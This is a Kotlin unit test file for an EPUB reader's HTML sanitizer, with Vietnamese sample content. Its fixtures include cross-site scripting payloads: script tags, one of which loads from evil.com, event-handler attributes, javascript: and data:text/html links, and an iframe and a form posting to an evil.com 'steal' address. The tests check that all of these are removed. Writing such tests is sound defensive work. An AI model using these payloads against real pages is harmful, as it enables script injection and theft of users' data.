package com.epubpro.core.reader.filter

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class EpubHtmlSanitizerTest {

    @Test
    fun `sanitize should remove script tags and content`() {
        val input = """
            <html>
            <head>
                <script>alert('xss');</script>
                <script src="http://evil.com/payload.js"></script>
            </head>
            <body>
                <p>Nội dung hợp lệ</p>
                <script type="text/javascript">document.cookie = "stolen";</script>
            </body>
            </html>
        """.trimIndent()

        val output = EpubHtmlSanitizer.sanitize(input)

        assertFalse("Script tag should be removed", output.contains("<script", ignoreCase = true))
        assertFalse("Script payload should be removed", output.contains("alert('xss')"))
        assertFalse("External script should be removed", output.contains("evil.com"))
        assertTrue("Valid text should be preserved", output.contains("Nội dung hợp lệ"))
    }

    @Test
    fun `sanitize should remove event handlers on elements`() {
        val input = """
            <body>
                <img src="valid_cover.jpg" onerror="alert(1)" onload="evil()" />
                <p onclick="stealData()" onmouseover="track()">Đoạn văn</p>
                <div onfocus="hack()">Khối văn bản</div>
            </body>
        """.trimIndent()

        val output = EpubHtmlSanitizer.sanitize(input)

        assertFalse(output.contains("onerror", ignoreCase = true))
        assertFalse(output.contains("onload", ignoreCase = true))
        assertFalse(output.contains("onclick", ignoreCase = true))
        assertFalse(output.contains("onmouseover", ignoreCase = true))
        assertFalse(output.contains("onfocus", ignoreCase = true))
        assertTrue(output.contains("src=\"valid_cover.jpg\""))
        assertTrue(output.contains("Đoạn văn"))
        assertTrue(output.contains("Khối văn bản"))
    }

    @Test
    fun `sanitize should remove javascript and vbscript urls`() {
        val input = """
            <body>
                <a href="javascript:alert(document.domain)">Bấm vào đây</a>
                <a href="  javascript : alert(1)">Khoảng trắng bypass</a>
                <a href="vbscript:msgbox(1)">VBScript link</a>
                <a href="https://example.com/chapter2">Link ngoài an toàn</a>
                <a href="#footnote-1">Link footnote</a>
            </body>
        """.trimIndent()

        val output = EpubHtmlSanitizer.sanitize(input)

        assertFalse(output.contains("javascript:", ignoreCase = true))
        assertFalse(output.contains("vbscript:", ignoreCase = true))
        assertTrue(output.contains("href=\"https://example.com/chapter2\""))
        assertTrue(output.contains("href=\"#footnote-1\""))
    }

    @Test
    fun `sanitize should remove dangerous active elements like iframe object embed form`() {
        val input = """
            <body>
                <h1>Chương 1</h1>
                <iframe src="http://evil.com/phishing"></iframe>
                <object data="evil.swf"></object>
                <embed src="flash.swf"></embed>
                <form action="http://evil.com/steal" method="POST">
                    <input type="text" name="data" value="123" />
                    <button type="submit">Submit</button>
                </form>
                <p>Nội dung cuối</p>
            </body>
        """.trimIndent()

        val output = EpubHtmlSanitizer.sanitize(input)

        assertFalse(output.contains("<iframe", ignoreCase = true))
        assertFalse(output.contains("<object", ignoreCase = true))
        assertFalse(output.contains("<embed", ignoreCase = true))
        assertFalse(output.contains("<form", ignoreCase = true))
        assertFalse(output.contains("<input", ignoreCase = true))
        assertFalse(output.contains("<button", ignoreCase = true))
        assertTrue(output.contains("Chương 1"))
        assertTrue(output.contains("Nội dung cuối"))
    }

    @Test
    fun `sanitize should allow safe data image uris but block other data uris`() {
        val input = """
            <body>
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" />
                <a href="data:text/html,<script>alert(1)</script>">Bấm xem</a>
            </body>
        """.trimIndent()

        val output = EpubHtmlSanitizer.sanitize(input)

        assertTrue("Safe data:image/png should be kept", output.contains("src=\"data:image/png;base64,"))
        assertFalse("Dangerous data:text/html should be stripped", output.contains("data:text/html"))
    }

    @Test
    fun `sanitize should preserve valid epub typography and vietnamese unicode`() {
        val input = """
            <!DOCTYPE html>
            <html xmlns="http://www.w3.org/1999/xhtml">
            <head><title>Chương 1: Tiêu đề Tiếng Việt</title></head>
            <body>
                <h1>Chương 1: Khởi Đầu Mới</h1>
                <p>Chào mừng bạn đến với <em>EpubPro</em>, ứng dụng đọc sách <strong>cao cấp</strong>.</p>
                <blockquote>“Đọc sách là nuôi dưỡng tâm hồn.”</blockquote>
                <table>
                    <thead><tr><th>Nhân vật</th><th>Vai trò</th></tr></thead>
                    <tbody><tr><td>Lý Mộc Điền</td><td>Nhân vật chính</td></tr></tbody>
                </table>
            </body>
            </html>
        """.trimIndent()

        val output = EpubHtmlSanitizer.sanitize(input)

        assertTrue(output.contains("Chương 1: Khởi Đầu Mới"))
        assertTrue(output.contains("Lý Mộc Điền"))
        assertTrue(output.contains("“Đọc sách là nuôi dưỡng tâm hồn.”"))
        assertTrue(output.contains("<em>EpubPro</em>"))
        assertTrue(output.contains("<strong>cao cấp</strong>"))
        assertTrue(output.contains("<table>"))
        assertTrue(output.contains("<th>Nhân vật</th>"))
    }

    @Test
    fun `sanitize should handle blank or empty input safely`() {
        assertEquals("", EpubHtmlSanitizer.sanitize(""))
        assertEquals("", EpubHtmlSanitizer.sanitize("   "))
    }
}
